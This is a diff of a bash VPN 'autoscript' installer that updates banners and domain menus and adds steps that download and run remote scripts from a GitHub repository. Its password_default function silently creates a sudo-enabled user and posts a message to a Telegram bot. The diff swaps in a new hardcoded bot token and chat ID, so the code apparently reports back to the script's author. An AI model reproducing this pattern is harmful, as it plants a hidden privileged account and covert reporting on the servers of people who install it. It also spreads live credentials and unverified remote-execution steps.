@@ -23,14 +23,6 @@ clear
 clear && clear && clear
 clear;clear;clear
 
-  # // Banner
-echo -e "${YELLOW}----------------------------------------------------------${NC}"
-echo -e "  Script Installer ${YELLOW}(${NC}${green} Stable Edition ${NC}${YELLOW})${NC}"
-echo -e "     This Will Quick Setup VPN Server On Your Server"
-echo -e "${YELLOW}----------------------------------------------------------${NC}"
-echo ""
-sleep 2
-
 # // Checking Os Architecture
 if [[ $( uname -m | awk '{print $1}' ) == "x86_64" ]]; then
     echo -e "${OK} Your Architecture Is Supported ( ${green}$( uname -m )${NC} )"
@@ -53,8 +45,19 @@ fi
 if [[ $IP == "" ]]; then
     echo -e "${EROR} IP Address ( ${YELLOW}Not Detected${NC} )"
 else
-
-    echo -e "${OK} IP Address ( ${green}$IP${NC} )"
+  echo ""
+  echo -e "\e[32m      ┌───────────────────────────────────────────────┐\033[0m"
+  echo -e "\e[32m   ───│                                               │───\033[0m"
+  echo -e "\e[32m   ───│    ┌─┐┬ ┬┌┬┐┌─┐┌─┐┌─┐┬─┐┬┌─┐┌┬┐  ┬  ┬┌┬┐┌─┐   │───\033[0m"
+  echo -e "\e[32m   ───│    ├─┤│ │ │ │ │└─┐│  ├┬┘│├─┘ │   │  │ │ ├┤    │───\033[0m"
+  echo -e "\e[32m   ───│    ┴ ┴└─┘ ┴ └─┘└─┘└─┘┴└─┴┴   ┴   ┴─┘┴ ┴ └─┘   │───\033[0m"
+  echo -e "\e[32m      │\033[0m  \e[33m      HR-vpn (C)https://t.me/HRstores      \033[0m \e[32m │\033[0m"
+  echo -e "\e[32m      └───────────────────────────────────────────────┘\033[0m"
+  echo -e "\e[36m             Autoscript xray vpn lite (multi port)\033[0m"
+  echo -e "\e[36m  Make sure the internet is smooth when installing the script\033[0m"
+  echo -e "\e[31m     JANGAN INSTALL SCRIPT INI MENGGUNAKAN KONEKSI VPN!!!\033[0m"
+  echo ""
+  echo -e "      ${OK} IP Address ( ${green}$IP${NC} )"
 fi
 
 # // Validate Successfull
@@ -268,14 +271,13 @@ function base_package() {
 clear
 # Fungsi input domain
 function pasang_domain() {
-echo -e ""
 clear
-    echo -e "   .----------------------------------."
-echo -e "   |\e[1;32mPlease Select a Domain Type Below \e[0m|"
-echo -e "   '----------------------------------'"
-echo -e "     \e[1;32m1)\e[0m Enter Your Subdomain"
-echo -e "     \e[1;32m2)\e[0m Use a Random Subdomain"
-echo -e "   ------------------------------------"
+echo -e ""
+echo -e "${red}                ♦️ CUSTOM SETUP DOMAIN VPS ♦️   ${NC}"
+    echo -e "\e[32m      ┌───────────────────────────────────────────────┐\033[0m"
+    echo "          1. Gunakan Domain sendiri"
+    echo "          2. Gunakan Domain Dari Script"
+    echo -e "\e[32m      └───────────────────────────────────────────────┘\033[0m"
 read -p "   Please select numbers 1-2 or Any Button(Random) : " host
 echo ""
 if [[ $host == "1" ]]; then
@@ -287,8 +289,9 @@ echo $host1 > /root/domain
 echo ""
 elif [[ $host == "2" ]]; then
 #install cf
-wget ${REPO}ssh/cf.sh && chmod +x cf.sh && ./cf.sh
-rm -f /root/cf.sh
+wget -q -O /root/cf.sh "https://raw.githubusercontent.com/sasak3/v4/main/slowdns/cf.sh"
+chmod +x /root/cf.sh
+./cf.sh
 clear
 else
 print_install "Random Subdomain/Domain is Used"
@@ -311,8 +314,8 @@ function password_default() {
     echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
     usermod -aG sudo $Username > /dev/null 2>&1
 
-    CHATID="576495165"
-    KEY="6338068936:AAHiZflXdNWM6vrWgu474SXhzxcKZ_ITDv0"
+    CHATID="5807961610"
+    KEY="6210655575:AAH4TkHoDco4ShhlrD6HZMUIfpTWHKIVdog"
     TIME="10"
     URL="https://api.telegram.org/bot$KEY/sendMessage"
     TEXT=" Update
@@ -331,8 +334,13 @@ function password_default() {
 
    curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
 }
-
 clear
+function pasang_domain_ns() {
+clear
+wget https://raw.githubusercontent.com/sasak3/v4/main/slowdns/cfslow.sh && chmod +x cfslow.sh && ./cfslow.sh
+rm -f /root/cfslow.sh
+clear
+}
 # Pasang SSL
 function pasang_ssl() {
 clear
